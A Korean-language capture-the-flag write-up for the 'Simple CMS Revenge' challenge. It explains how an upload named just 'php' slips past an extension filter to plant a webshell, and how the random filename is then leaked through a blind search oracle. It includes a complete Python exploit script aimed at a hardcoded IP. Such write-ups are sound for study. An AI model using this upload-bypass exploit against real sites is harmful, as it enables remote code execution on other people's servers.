## Simple CMS Revenge

- 취약점 타입
  1. WebShell
  2. Leak Information



- WebShell 취약점

classes/Report_lib.class.php Line : 23 

````php
$file_name = $file['name'];
....
$file_name = check_filename($file_name);
````

file_name 변수에 _FILES로 받은 파일이 들어가는데 이 값을 chekc_filename 함수로 체크를 한다

functions/lib.php Line : 40

```php
function check_filename($fn){
	$fn = preg_replace('/[^a-z0-9A-Z\.]/i', '', $fn);	
	if(preg_match("/\.(ph|htm|py|rb|ruby|jsp|asp|cgi|ht|htaccess)/is", $fn)){
		return false;
	}
	return $fn;
}
```

함수를 보면 a-z0-9A-Z.를 제외한 모든 스트링을 공백으로 바꾸고, 파일명이 .php, .pht. .jsp이 포함 되어있으면 필터링을 한다.

하지만 test.php은 필터링을 하지만 파일명을 'php' 로만 첫번째 파트가 우회가 된다.

파일명이 php인데 웹쉘이 가능한 이유는 다음 함수 때문이다.

```php
function set_filename($fn){
	$fn = array_pop(explode('.', $fn));
	$fn = bin2hex(rand_str(15)) . '_'. ip2long($_SERVER['REMOTE_ADDR']) . '.' . $fn;

	return $fn;
}
```

filename을 인자로 받는 set_filename은 확장자를 걸러내주기 위해 .로 문자열을 split한다음에 배열중 맨 마지막을 pop해서 값을 가져온다 



하지만 파일명이 php이므로 .을 split 해봤자 결과는 array('php') 일것이다 그리고 그 값을 pop 해준다음



randome_str.php 이런식으로 결과가 완성이 되고 파일이 업로드 될것이다.

그리고 이 파일 이름을 릭 해야 되는데 이건 검색 기능을 이용해서 알아낼수가 있다.



```php
function action_search(){
	$column = Context::get('col');
	$search = Context::get('search');
	$type = strtolower(Context::get('type'));
	$operator = 'or';
	
	if($type === '1'){
		$operator = 'or';
	}
	else if($type === '2'){
		$operator = 'and';
	}
	if(preg_match('/[^a-zA-Z0-9\|]/is', $column)){
		$column = 'title';
	}
	
	$query = get_search_query($column, $search, $operator);

	$query = "id='{$_SESSION['id']}' and ".$query;
	$result = DB::fetch_multi_row('report', '', '', '0, 10','idx desc', $query);
	include(CMS_SKIN_PATH . 'report.php');
}
```

exploit code

```python
import requests


#header = {'Cookie': 'PHPSESSID=erj64ibm3fah50bmr15065j0a1'} #local
header ={'Cookie': 'PHPSESSID=incfj5egnoo503jhe5p1h0jhb5'}
def find_path(condtion, path):	
	ascii_table = '0123456789abcdef_'
	for _str in ascii_table:
		if condtion == '1':
			try_str = path + _str
		else:
			try_str = _str + path
		#url = 'http://127.0.0.1/simple_cms_revenge/index.php?act=report&mid=search&col=file&type=1&search={}'.format(try_str)
		url = 'http://211.117.60.187/index.php?act=report&mid=search&col=file&type=1&search={}'.format(try_str)
		if requests.get(url, headers=header).text.find('<tr><td>Did</td><td>you</td><td>find</td><td>a bug?</td></tr>') == -1:
			return _str
	return False

		

#url = "http://127.0.0.1/simple_cms_revenge/index.php?act=report&mid=write"
url = "http://211.117.60.187/index.php?act=report&mid=write"
data  =  {
	"title": "hello",
	"content": "cottent",
}
f = {
	'image': open('php', 'rb')
}

if requests.post(url, headers=header, files=f, data=data).text.find('report!') != -1:
	print 'upload shell'

	path = '.php'
	while True:
		tmp = find_path('1', path)
		if tmp == False:
			break
		path += tmp
		print path
	while True:
		tmp = find_path('2', path)
		if tmp == False:
			break
		path = tmp + path
		print path

print 'you can get shell data/simple_cms_upload/report/{}'.format(path)

```



